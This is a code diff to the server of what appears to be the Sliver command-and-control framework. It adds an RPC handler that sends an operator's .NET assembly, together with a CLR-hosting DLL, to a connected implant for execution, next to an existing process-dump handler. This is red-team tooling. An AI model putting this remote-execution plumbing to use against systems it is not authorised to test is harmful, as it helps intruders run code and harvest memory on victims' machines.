@@ -6,6 +6,7 @@ import (
 	"log"
 	"path"
 	pb "sliver/protobuf/client"
+	"sliver/server/assets"
 	"sliver/server/core"
 	"sliver/server/generate"
 	"time"
@@ -133,4 +134,35 @@ func rpcProcdump(req []byte, resp RPCResponse) {
 	timeout := time.Duration(procdumpReq.Timeout) * time.Second
 	data, err = sliver.Request(sliverpb.MsgProcessDumpReq, timeout, data)
 	resp(data, err)
+}
+
+func rpcExecuteAssembly(req []byte, resp RPCResponse) {
+	execReq := &sliverpb.ExecuteAssemblyReq{}
+	err := proto.Unmarshal(req, execReq)
+	if err != nil {
+		resp([]byte{}, err)
+		return
+	}
+	sliver := (*core.Hive.Slivers)[int(execReq.SliverID)]
+	if sliver == nil {
+		resp([]byte{}, err)
+		return
+	}
+	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
+	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
+	if err != nil {
+		resp([]byte{}, err)
+		return
+	}
+	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
+		Assembly:   execReq.Assembly,
+		HostingDll: hostingDllBytes,
+		Arguments:  execReq.Arguments,
+		Timeout:    execReq.Timeout,
+		SliverID:   execReq.SliverID,
+	})
+	timeout := time.Duration(execReq.Timeout) * time.Second
+	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
+	resp(data, err)
+
 }
